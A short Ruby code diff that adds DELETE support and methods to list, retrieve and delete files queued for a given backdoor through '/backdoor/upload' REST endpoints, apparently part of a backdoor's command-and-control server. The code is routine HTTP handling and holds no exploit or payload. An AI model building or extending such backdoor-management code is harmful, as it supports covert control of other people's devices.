@@ -55,6 +55,8 @@ class DB_rest
               @http.request_post(uri, content, full_headers)
             when 'GET'
               @http.request_get(uri, full_headers)
+            when 'DELETE'
+              @http.delete(uri, full_headers)
           end
         end
       end
@@ -226,6 +228,38 @@ class DB_rest
     rescue Exception => e
       trace :error, "Error calling backdoor_status: #{e.class} #{e.message}"
       return DB::UNKNOWN_BACKDOOR, 0
+    end
+  end
+
+
+
+  def new_uploads(bid)
+    begin
+      ret = rest_call('GET', "/backdoor/uploads/#{bid}")
+
+      upl = {}
+      # parse the results and get the contents of the uploads
+      JSON.parse(ret.body).each do |elem|
+        request = {:backdoor_id => bid, :upload_id => elem['upload_id']}
+        upl[elem['upload_id']] = {:filename => elem['filename'],
+                                  :content => rest_call('GET', "/backdoor/upload/#{request.to_json}").body }
+        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['upload_id']][:content].length} bytes"
+      end
+
+      return upl 
+    rescue Exception => e
+      trace :error, "Error calling new_uploads: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def del_upload(bid, id)
+    begin
+      request = {:backdoor_id => bid, :upload_id => id}
+      return rest_call('DELETE', "/backdoor/upload/#{request.to_json}")
+    rescue Exception => e
+      trace :error, "Error calling del_upload: #{e.class} #{e.message}"
+      propagate_error e
     end
   end
 
